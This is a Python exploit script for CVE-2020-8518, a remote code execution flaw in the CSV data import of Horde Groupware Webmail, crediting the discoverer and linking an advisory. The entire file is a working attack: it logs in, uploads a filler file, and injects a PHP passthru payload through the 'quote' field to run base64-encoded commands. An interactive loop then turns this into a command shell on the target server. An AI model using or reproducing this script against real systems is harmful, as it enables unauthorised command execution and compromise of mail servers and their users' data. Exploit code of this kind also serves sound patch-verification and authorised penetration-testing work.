#!/usr/bin/python3
#
# CVE-2020-8518 Custom script by Zipnx
# Credits: Andrea Cardaci for discovering the issue
# More info here: https://cardaci.xyz/advisories/2020/03/10/horde-groupware-webmail-edition-5.2.22-rce-in-csv-data-import/
#

import requests
import base64
import os
from requests_toolbelt.multipart.encoder import MultipartEncoder
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class bcolors:
    blue = '\033[94m'
    green = '\033[92m'
    red = '\033[91m'

def login(url, username, password):
    session = requests.Session()
    #session.proxies = {'http' : '127.0.0.1:8080', 'https' : '127.0.0.1:8080'} #Just for burp debugging 
    
    print(bcolors.blue + '[+] Logging in to {0}'.format(url))

    data = {
        'login_post': 1,
        'horde_user': username,
        'horde_pass': password
    }

    r = session.post(url+'login.php', data=data, verify=False, headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36'})
    cookies = session.cookies.get_dict()
    if 'horde_secret_key' in cookies.keys():
        print(bcolors.green + '[+] Logged in successfuly')
        return session, cookies
    else:
        print(bcolors.red + '[-] Failed to log in')
        quit()

def upload_file(session, url, cook):
    print(bcolors.blue + '[+] Uploading file to server')

    mime_data = MultipartEncoder(
        fields={
            'actionID': '11',
            'import_step': '1',
            'import_format': 'csv',
            'notepad_target': 'abcdefghijklmnop',
            'import_file': ('test.txt', open('test.txt', 'rb'), 'text/plain')
        }
    )

    r = session.post(url+'mnemo/data.php', data=mime_data, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Content-Type': mime_data.content_type}, cookies=cook, verify=False)
    #print(r.text)
    #print(r.status_code)
    if r.status_code == 200:
        print(bcolors.green + '[+] Successfully uploaded file')
    else:
        print(bcolors.red + '[-] Unable to post dummy file Code: {0}'.format(str(r.status_code)))
        quit()

def execute_command(session, url, cook, cmd):
    encoded_cmd = base64.b64encode(cmd.encode('utf-8'))
    payload = ').passthru(base64_decode(\"' + encoded_cmd.decode() + '\")).die();}//\\'
    #print(payload)

    data = {
        'actionID': 3,
        'import_format': 'csv',
        'import_step': 2,
        'header': 1,
        'sep': '\"',
        'quote': payload,
        'fields': 1
    }
    #r = session.get(url+'mnemo/data.php', cookies=cook)
    #print(r.text)
    r = session.post(url+'mnemo/data.php', data=data, cookies=cook, headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36'}, verify=False)
    if r.status_code == 200:
        if True:
            return r.text
    else:
        print(bcolors.red + '[-] Failed to execute command')
        quit()

url = ''
username = ''
password = ''

def main():
    
    if len(sys.argv) < 4:
        print('Usage: {0} <url> <username> <password>'.format(sys.argv[0]))
        quit()
    else:
        url = sys.argv[1]
        username = sys.argv[2]
        password = sys.argv[3]

    print(bcolors.green + '[+] Running exploit')
    
    try:
        os.system('echo "filler" > test.txt')
        print(bcolors.green + '[+] Created temporary file "test.txt"')
    except Exception:
        print(bcolor.red + '[-] Unable to create temporary file')
    
    s, c = login(url, username, password)
    upload_file(s, url, c)
    directory = execute_command(s, url, c, cmd='pwd').strip('\n')
    print(bcolors.green + '[+] Have fun shopping')
    while True:
        try:
            cmd = str(input('{0}$ '.format(directory))).strip('\n')
            print(execute_command(s, url, c, cmd=cmd))
        except KeyboardInterrupt:
            print(bcolors.red + '\n[-] Exiting...')
            break
    
    try:
        os.system('rm test.txt')
        print(bcolors.green + '[+] Deleted temporary file')
    except Exception:
        print(bcolor.red + '[-] Unable to delete temporary file')


if __name__ == '__main__':
    main()
